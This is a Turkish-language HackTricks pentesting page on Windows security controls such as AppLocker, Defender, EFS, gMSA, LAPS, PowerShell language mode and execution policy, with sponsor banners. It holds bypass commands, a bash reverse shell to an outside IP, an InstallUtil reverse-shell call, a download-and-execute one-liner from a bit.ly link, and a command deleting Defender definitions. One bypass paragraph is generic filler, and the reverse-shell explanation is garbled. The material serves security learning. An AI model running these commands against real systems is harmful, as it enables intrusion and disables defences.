# Windows Güvenlik Kontrolleri

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **Trickest** kullanarak kolayca iş akışları oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker Politikası

Uygulama beyaz listesi, bir sisteme yüklenmesine ve çalıştırılmasına izin verilen onaylanmış yazılım uygulamalarının veya yürütülebilir dosyaların bir listesidir. Amaç, zararlı kötü amaçlı yazılımlardan ve belirli bir işletmenin özel ihtiyaçlarıyla uyumlu olmayan onaylanmamış yazılımlardan ortamı korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **uygulama beyaz listeleme çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** konusunda kontrol sağlar. Yürütülebilir dosyalar, komut dosyaları, Windows yükleyici dosyaları, DLL'ler, paketli uygulamalar ve paketli uygulama yükleyicileri üzerinde **ayrıntılı kontrol** sağlar.\
Organizasyonların genellikle cmd.exe ve PowerShell.exe'yi engellediği ve belirli dizinlere yazma erişimini engellediği **ancak bunların hepsinin atlatılabileceği** yaygındır.

### Kontrol

Hangi dosya/uzantıların siyah listeye/beyaz listeye alındığını kontrol edin:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve politikaları içerir ve sistemde uygulanan mevcut kurallar kümesini gözden geçirmek için bir yol sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### Atlama

* AppLocker Politikasını atlamanın yararlı **Yazılabilir klasörleri**: Eğer AppLocker, `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyi çalıştırmaya izin veriyorsa, bu durumu **atlamanızı sağlayacak yazılabilir klasörler** bulunmaktadır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Ortak olarak **güvenilen** [**"LOLBAS"**](https://lolbas-project.github.io/) ikili dosyaları, AppLocker'ı atlamak için de kullanışlı olabilir.
* **Kötü yazılmış kurallar da atlanabilir**.
* Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, herhangi bir yerde **`allowed`** adında bir klasör oluşturabilir ve izin verilecektir.
* Kuruluşlar genellikle `%System32%\WindowsPowerShell\v1.0\powershell.exe` yürütülebilir dosyasını engellemeye odaklanırken, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi **diğer** [**PowerShell yürütülebilir dosya konumlarını**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) unuturlar.
* **DLL uygulaması çok nadiren etkinleştirilir** çünkü sisteme ek yük getirebilir ve hiçbir şeyin bozulmayacağını sağlamak için gereken test miktarı vardır. Bu nedenle, **DLL'leri arka kapı olarak kullanmak, AppLocker'ı atlamaya yardımcı olur**.
* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir işlemde Powershell kodunu **yürütebilir** ve AppLocker'ı atlayabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Kimlik Bilgileri Depolama

### Güvenlik Hesap Yöneticisi (SAM)

Yerel kimlik bilgileri bu dosyada bulunur, şifreler karma olarak saklanır.

### Yerel Güvenlik Yetkilisi (LSA) - LSASS

**Kimlik bilgileri** (karma) tek oturum açma nedenleriyle bu alt sistem belleğinde **saklanır**.\
LSA, yerel **güvenlik politikasını** (şifre politikası, kullanıcı izinleri...), **kimlik doğrulama**, **erişim belirteçleri** gibi şeyleri yönetir.\
LSA, yerel bir oturum açma için **SA**M dosyasında sağlanan kimlik bilgilerini **kontrol eder** ve bir etki alanı kullanıcısını doğrulamak için **etki alanı denetleyicisi** ile iletişim kurar.

**Kimlik bilgileri**, **LSASS** işlemi içinde saklanır: Kerberos biletleri, NT ve LM karmaşık şifreler, kolayca şifrelenmiş şifreler.

### LSA sırları

LSA, bazı kimlik bilgilerini diske kaydedebilir:

* Erişilemeyen etki alanı denetleyicisinin bilgisayar hesabının şifresi.
* Windows hizmetlerinin hesaplarının şifreleri
* Zamanlanmış görevler için şifreler
* Daha fazlası (IIS uygulamalarının şifresi...)

### NTDS.dit

Bu, Etki Alanı Denetleyicilerinde bulunan Active Directory veritabanıdır.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirüstür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Bununla birlikte, bu korumaları **atlamak** için yollar vardır.

### Kontrol

Defender'ın **durumunu kontrol** etmek için PS cmdlet **`Get-MpComputerStatus`**'u çalıştırabilirsiniz (etkin olup olmadığını anlamak için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Numaralandırmak için ayrıca şunu çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Şifrelenmiş Dosya Sistemi (EFS)

EFS, dosyaları şifreleme yoluyla güvence altına alır ve **Dosya Şifreleme Anahtarı (FEK)** olarak bilinen bir **simetrik anahtar** kullanır. Bu anahtar, kullanıcının **genel anahtarı** ile şifrelenir ve şifrelenmiş dosyanın $EFS **alternatif veri akışı** içinde depolanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasının karşılık gelen **özel anahtarı** kullanılarak FEK $EFS akışından şifre çözülür. Daha fazla ayrıntıya [buradan](https://en.wikipedia.org/wiki/Encrypting_File_System) ulaşabilirsiniz.

**Kullanıcı başlatması olmadan şifre çözme senaryoları** şunları içerir:

- Dosya veya klasörlerin [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir dosya sistemi üzerine taşındığında otomatik olarak şifre çözülür.
- SMB/CIFS protokolü aracılığıyla ağ üzerinden gönderilen şifreli dosyalar, iletimden önce şifre çözülür.

Bu şifreleme yöntemi, sahibin şifreli dosyalara **saydam erişim** sağlar. Bununla birlikte, sadece sahibin şifresini değiştirmek ve oturum açmak, şifre çözümüne izin vermeyecektir.

**Anahtar Noktalar**:
- EFS, kullanıcının genel anahtarı ile şifrelenen simetrik bir FEK kullanır.
- Şifre çözme, FEK'ye erişmek için kullanıcının özel anahtarını kullanır.
- Kopyalama işlemi FAT32'ye veya ağ iletimine gibi belirli koşullar altında otomatik şifre çözme gerçekleştirir.
- Şifreli dosyalara sahip olan kullanıcı, ek adımlar olmadan erişebilir.

### EFS bilgisini kontrol etme

Bu **hizmeti** kullanan bir **kullanıcının** bu **dizini** kullanarak **kullanıp kullanmadığını** kontrol edin: `C:\users\<kullanıcıadı>\appdata\roaming\Microsoft\Protect`

Dosyaya **kimin** erişimi olduğunu kontrol etmek için `cipher /c \<dosya>` komutunu kullanabilirsiniz.
Ayrıca, tüm dosyaları **şifrelemek** ve **şifre çözmek** için bir klasör içinde `cipher /e` ve `cipher /d` komutlarını kullanabilirsiniz.

### EFS dosyalarını şifre çözme

#### Yetkili Sistem Olarak Olmak

Bu yöntem, **hedef kullanıcının** ana bilgisayarda bir **işlem** çalıştırıyor olmasını gerektirir. Bu durumda, bir `meterpreter` oturumu kullanarak kullanıcının işleminin belirteci (`incognito`'dan `impersonate_token`) taklit edilebilir. Veya sadece kullanıcının işlemine `migrate` edebilirsiniz.

#### Kullanıcının şifresini bilmek

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Grup Yönetimli Hizmet Hesapları (gMSA)

Microsoft, IT altyapılarında hizmet hesaplarının yönetimini kolaylaştırmak için **Grup Yönetimli Hizmet Hesapları (gMSA)** geliştirdi. Sıklıkla "**Şifre asla süresi dolmaz**" ayarının etkin olduğu geleneksel hizmet hesaplarının aksine, gMSA'lar daha güvenli ve yönetilebilir bir çözüm sunar:

- **Otomatik Şifre Yönetimi**: gMSA'lar, etki alanı veya bilgisayar politikasına göre otomatik olarak değişen, 240 karakterlik karmaşık bir şifre kullanır. Bu işlem, Microsoft'un Anahtar Dağıtım Hizmeti (KDC) tarafından yönetilir ve manuel şifre güncellemelerine ihtiyaç duyulmasını ortadan kaldırır.
- **Geliştirilmiş Güvenlik**: Bu hesaplar kilitlenmeye karşı bağışıklıdır ve etkileşimli oturum açmalar için kullanılamaz, güvenliklerini artırır.
- **Birden Fazla Ana Bilgisayar Desteği**: gMSA'lar birden çok ana bilgisayar üzerinde paylaşılabilir, bu da birden çok sunucuda çalışan hizmetler için idealdir.
- **Zamanlanmış Görev Yeteneği**: Yönetilen hizmet hesaplarının aksine, gMSA'lar zamanlanmış görevleri çalıştırmayı destekler.
- **Basitleştirilmiş SPN Yönetimi**: Sistem, bilgisayarın sAMaccount ayrıntılarında veya DNS adında değişiklik olduğunda Hizmet İlkesi Adı (SPN) otomatik olarak güncellenir, SPN yönetimini basitleştirir.

gMSA'ların şifreleri, LDAP özelliği _**msDS-ManagedPassword**_ içinde depolanır ve her 30 günde bir Oturum Açma Denetleyicileri (DC'ler) tarafından otomatik olarak sıfırlanır. Bu şifre, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen şifrelenmiş bir veri bloğu şeklinde saklanır ve yalnızca yetkili yöneticiler ve gMSA'ların kurulu olduğu sunucular tarafından alınabilir, böylece güvenli bir ortam sağlanır. Bu bilgilere erişmek için LDAPS gibi güvenli bir bağlantı gereklidir veya bağlantı 'Mühürleme ve Güvenli' ile kimlik doğrulamalıdır.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Bu şifreyi [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) ile okuyabilirsiniz:
```
/GMSAPasswordReader --AccountName jkohler
```
**[Bu gönderide daha fazla bilgi bulun](https://cube0x0.github.io/Relaying-for-gMSA/)**

Ayrıca, **NTLM iletim saldırısı** gerçekleştirmek için **gMSA**'nın **şifresini okumak** için bu [web sayfasını](https://cube0x0.github.io/Relaying-for-gMSA/) kontrol edin.

## LAPS

**Local Administrator Password Solution (LAPS)**, [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) tarafından indirilebilir durumda olup yerel Yönetici şifrelerinin yönetimini sağlar. Bu şifreler, merkezi olarak Active Directory'de depolanır ve **rastgele**, benzersiz ve düzenli olarak değiştirilir. Bu şifrelere erişim, yetkilendirilmiş kullanıcılara ACL'ler aracılığıyla kısıtlanır. Yeterli izinler verildiğinde, yerel yönetici şifrelerini okuma yeteneği sağlanır.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Kısıtlanmış Dil Modu

PowerShell [**Kısıtlanmış Dil Modu**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'ı etkili bir şekilde kullanmak için gereken birçok özelliği kısıtlar, COM nesnelerini engeller, yalnızca onaylanmış .NET türlerine izin verir, XAML tabanlı iş akışları, PowerShell sınıfları ve daha fazlası.

### **Kontrol Et**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Atlama

Bir hedef sisteme erişim sağlamak için kullanılan birçok yöntem vardır. Bu yöntemlerden biri de atlama yöntemidir. Atlama, hedef sistemin güvenlik önlemlerini aşmak veya atlamak için kullanılan bir dizi teknik ve stratejileri ifade eder.

Atlama yöntemleri, hedef sistemin kimlik doğrulama, yetkilendirme, UAC (Kullanıcı Hesap Denetimi) ve EFS (Encrypting File System) gibi güvenlik mekanizmalarını hedef alabilir. Bu yöntemler, saldırganın hedef sisteme erişim sağlamasını kolaylaştırabilir ve yetkisiz erişim elde etmesine olanak tanır.

Bu bölümde, atlama yöntemlerinin nasıl çalıştığını ve nasıl önlem alınabileceğini öğreneceksiniz. Bu bilgiler, saldırıları önlemek ve sistemlerinizi güvende tutmak için önemlidir.
```powershell
#Easy bypass
Powershell -version 2
```
Şu anki Windows sürümünde bu bypass çalışmayacak, ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** **bir Referans eklemeniz gerekebilir** -> _Gözat_ -> _Gözat_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` ekleyin ve **proje .Net4.5'e değiştirin**.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Ters Kabuk:

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Bu komut, hedef makineye ters bir kabuk bağlantısı sağlar. Kabuk, 10.0.0.1 IP adresine ve 8080 portuna yönlendirilir.
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak, kısıtlanmış modu atlayarak herhangi bir işlemde **Powershell** kodunu çalıştırabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Yürütme Politikası

Varsayılan olarak **sınırlı** olarak ayarlanmıştır. Bu politikayı atlatmanın temel yolları:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlası [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) bulunabilir.

## Güvenlik Destek Sağlayıcı Arayüzü (SSPI)

Kullanıcıların kimlik doğrulaması yapmak için kullanabileceği bir API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmakla görevlidir. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder. Bu kimlik doğrulama protokolleri Güvenlik Destek Sağlayıcı (SSP) olarak adlandırılır ve her Windows makinesinin içinde bir DLL olarak bulunur ve iletişim kurabilmek için her iki makine de aynı desteği sağlamalıdır.

### Ana SSP'ler

* **Kerberos**: Tercih edilen yöntem
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Web sunucuları ve LDAP, MD5 karmaşık bir parola
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL ve TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM olabilir, Kerberos varsayılan olanıdır)
* %windir%\Windows\System32\lsasrv.dll

#### Müzakere birden fazla yöntem sunabilir veya sadece bir yöntem sunabilir.

## Kullanıcı Hesabı Denetimi (UAC)

[Kullanıcı Hesabı Denetimi (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerine**](https://peass.creator-spring.com) göz atın
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da** takip edin.
* Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek **hacking hilelerinizi paylaşın**.

</details>
